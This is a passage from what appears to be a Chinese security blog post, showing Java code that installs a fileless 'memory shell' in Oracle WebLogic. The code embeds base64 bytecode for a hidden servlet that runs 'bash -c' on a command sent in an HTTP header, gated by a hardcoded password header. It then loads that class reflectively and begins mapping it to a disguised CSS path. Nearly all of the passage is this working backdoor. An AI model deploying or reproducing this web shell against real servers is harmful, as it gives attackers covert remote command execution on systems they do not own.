</span></span><span style=display:flex><span>            ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String bytecode<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>bytecode<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>完整反序列化，安装内存马：memsi.java</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-69>69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-70>70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-71>71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-72>72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-73>73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-74>74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-116-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-116-75>75</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.utils.ServletMapping<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.Servlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.InvocationTargetException<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Method<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsi</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>memsi</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        Class memsHttpServlet<span style=color:#f92672>=</span><span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            String pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADEAbgoAGgAyCAAzCwA0ADUIADYKAAYANwcAOAgAOQgAOggAOwcAPAoAPQA+CgA9AD8KAEAAQQoACgBCCABDCgAKAEQLAEUARgoACgBHCgAKAEgIAEkKAEoASwcATAcATQoAFwBOBwBsBwBQAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABpMcGVycy9uZW8vbWVtc0h0dHBTZXJ2bGV0OwEABWRvR2V0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAGcGFzc3dkAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY21kYXJyYXkBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAFG1lbXNIdHRwU2VydmxldC5qYXZhDAAbABwBAA94LWZvcndhcmRlZC1mdXIHAFEMAFIAUwEADG5lb3M0eWgzbGwwIQwAVABVAQAQamF2YS9sYW5nL1N0cmluZwEABGJhc2gBAAItYwEAD3gtZm9yd2FyZGVkLWZhcgEAEWphdmEvdXRpbC9TY2FubmVyBwBWDABXAFgMAFkAWgcAWwwAXABdDAAbAF4BAAJcQQwAXwBgBwBhDABiAGMMAGQAZQwAZgBnAQAABwBoDABpAGoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MABsAawEAGHBlcnMvbmVvL21lbXNIdHRwU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABlwZXJzL25lby9tZW1zSHR0cFNlcnZsZXRiAQAbTHBlcnMvbmVvL21lbXNIdHRwU2VydmxldGI7ACEAGQAaAAAAAAACAAEAGwAcAAEAHQAAAC8AAQABAAAABSq3AAGxAAAAAgAeAAAABgABAAAABwAfAAAADAABAAAABQAgAG0AAAAEACIAIwABAB0AAAEAAAUABgAAAHIrEgK5AAMCAE4SBC22AAWaAASxBr0ABlkDEgdTWQQSCFNZBSsSCbkAAwIAUzoEuwAKWbgACxkEtgAMtgANtwAOEg+2ABA6BSy5ABEBABkFtgASmQALGQW2ABOnAAUSFLYAFacADzoFuwAXWRkFtwAYv7EAAQAuAGIAZQAWAAIAHgAAACYACQAAAAoACQALABMADQAuABIARwATAGIAFgBlABQAZwAVAHEAFwAfAAAASAAHAEcAGwAkACUABQBnAAoAJgAnAAUAAAByACAAbQAAAAAAcgAoACkAAQAAAHIAKgArAAIACQBpACwALQADAC4ARAAuAC8ABAABADAAAAACADE=&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            Method defineClass<span style=color:#f92672>=</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;defineClass&#34;</span><span style=color:#f92672>,</span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span><span style=color:#f92672>{</span><span style=color:#75715e>//in case we may want to replay memsi request
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                memsHttpServlet<span style=color:#f92672>=(</span>Class<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetException e<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                memsHttpServlet<span style=color:#f92672>=</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            HttpServlet httpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 获取servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 获取servletMapping
